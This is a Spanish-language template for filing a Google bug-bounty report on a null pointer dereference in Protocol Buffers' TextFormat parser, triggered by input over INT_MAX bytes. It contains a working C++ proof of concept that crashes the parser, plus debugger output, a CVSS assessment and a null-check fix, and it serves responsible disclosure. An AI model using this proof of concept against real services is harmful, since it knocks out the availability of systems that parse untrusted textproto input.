# Google VRP - Formulario de Reporte (Copiar-Pegar)

**URL:** https://bughunters.google.com  
**Project:** Protocol Buffers  
**Vulnerability Type:** Denial of Service / Null Pointer Dereference

---

## CAMPO 1: "Report description" (200 caracteres máximo)

**Copia y pega esto exactamente:**

```
TextFormat::Parser crashes with null pointer dereference when input exceeds INT_MAX bytes. CheckParseInputSize() calls error_collector->RecordError() without null check. error_collector defaults to nullptr.
```

**Conteo:** 198 caracteres

---

## CAMPO 2: "The problem" (Markdown)

**Copia y pega esto exactamente:**

## Vulnerability Details

**Location:** `src/google/protobuf/text_format.cc` lines 1945-1955

**Root Cause:**

Parser constructor sets error_collector to nullptr by default:

```cpp
TextFormat::Parser::Parser()
    : error_collector_(nullptr),  // NULL by default
      ...
```

CheckParseInputSize calls method on potentially null pointer:

```cpp
template <typename T>
bool CheckParseInputSize(T& input, io::ErrorCollector* error_collector) {
  if (input.size() > INT_MAX) {
    error_collector->RecordError(  // No null check - crashes here
        -1, 0,
        absl::StrCat("Input size too large: ", ...));
    return false;
  }
  return true;
}
```

**Proof of Concept - C++ Execution:**

```cpp
#include "google/protobuf/text_format.h"
#include <climits>
#include <sys/mman.h>

int main() {
  // Sparse file - no real memory used
  constexpr size_t kSize = static_cast<size_t>(INT_MAX) + 1;
  int fd = mkstemp("/tmp/test.XXXXXX");
  ftruncate(fd, kSize);
  void* mapped = mmap(nullptr, kSize, PROT_READ, MAP_PRIVATE, fd, 0);
  
  google::protobuf::Any message;
  google::protobuf::TextFormat::Parser parser;
  parser.ParseFromString(
      std::string_view(static_cast<const char*>(mapped), kSize), 
      &message);  // CRASH
}
```

**Compilation:**
```bash
clang++ -std=c++17 poc.cpp $(pkg-config --cflags --libs protobuf) -o poc
./poc
# Segmentation fault: 11 (exit 139)
```

**LLDB Verification:**

```
(lldb) run
stop reason = EXC_BAD_ACCESS (code=1, address=0x0)

(lldb) register read x19
x19 = 0x0000000000000000

(lldb) bt
frame #0: CheckParseInputSize()  <- crash
frame #1: ParseFromString()
frame #2: main()

(lldb) frame variable
error_collector_ = nullptr   <- root cause
kSize = 2147483648           <- INT_MAX + 1
```

**Crash is at address 0x0** - direct null pointer dereference when calling RecordError() on null error_collector.

---

## CAMPO 3: "Impact analysis"

**Copia y pega esto exactamente:**

```
## Impact

**Severity:** MEDIUM - CVSS 5.9  
**Vector:** CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H

### Affected Functions
- TextFormat::Parser::ParseFromString()
- TextFormat::Parser::MergeFromString()
- TextFormat::Parser::Parse()
- TextFormat::Parser::ParseFromCord()

### Attack Surface
- Services processing large textproto files
- Batch processing systems without size limits
- Internal tools handling untrusted input

### Limitations
- Requires >2GB input (high bandwidth)
- Most services have lower size limits
- Primarily affects bulk data processing scenarios

### Vulnerability Type
**Denial of Service via Null Pointer Dereference**
- Availability Impact: HIGH
- Confidentiality Impact: NONE
- Integrity Impact: NONE

### Technical Details
- Trigger: input.size() > INT_MAX (2,147,483,647 bytes)
- Crash: SIGSEGV at address 0x0
- Exit code: 139
- Register x19 = 0x0 (null error_collector pointer)
```

---

## CAMPO 4: "Choose the type of vulnerability"

**Selecciona del dropdown:**

```
Denial of Service
```

(O si disponible: "Null Pointer Dereference")

---

## CAMPO 5: "Upload file"

**Copia el archivo PoC:**

```bash
cp /Users/carlosgomez/Documents/IOActice/Researchs/agent-audit/vulnhunter/bugs/protobuf-textformat-oversize/poc/oversize_textformat.cc ~/Desktop/
```

**Descripción para el upload:**
```
C++ proof of concept - SIGSEGV at address 0x0 when input > INT_MAX bytes (exit 139)
```

---

## VERIFICACIONES ANTES DE ENVIAR

- **Report description:** 198 caracteres  
- **The problem:** Código vulnerable + PoC + LLDB output real  
- **Impact:** CVSS score + vector  
- **Vulnerability type:** Denial of Service  
- **Upload file:** oversize_textformat.cc  

---

## INFORMACIÓN RÁPIDA

| Campo | Valor |
|-------|-------|
| **CVSS Score** | 5.9 (Medium) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H |
| **Vuln Type** | Denial of Service / Null Pointer Dereference |
| **Component** | TextFormat::Parser |
| **File** | src/google/protobuf/text_format.cc |
| **Lines** | 1945-1955 |
| **Trigger** | input > INT_MAX bytes |
| **Result** | SIGSEGV at 0x0 (exit 139) |

---

## FIX RECOMENDADO

```cpp
if (input.size() > INT_MAX) {
  if (error_collector != nullptr) {  // Add null check
    error_collector->RecordError(-1, 0, ...);
  }
  return false;
}
```
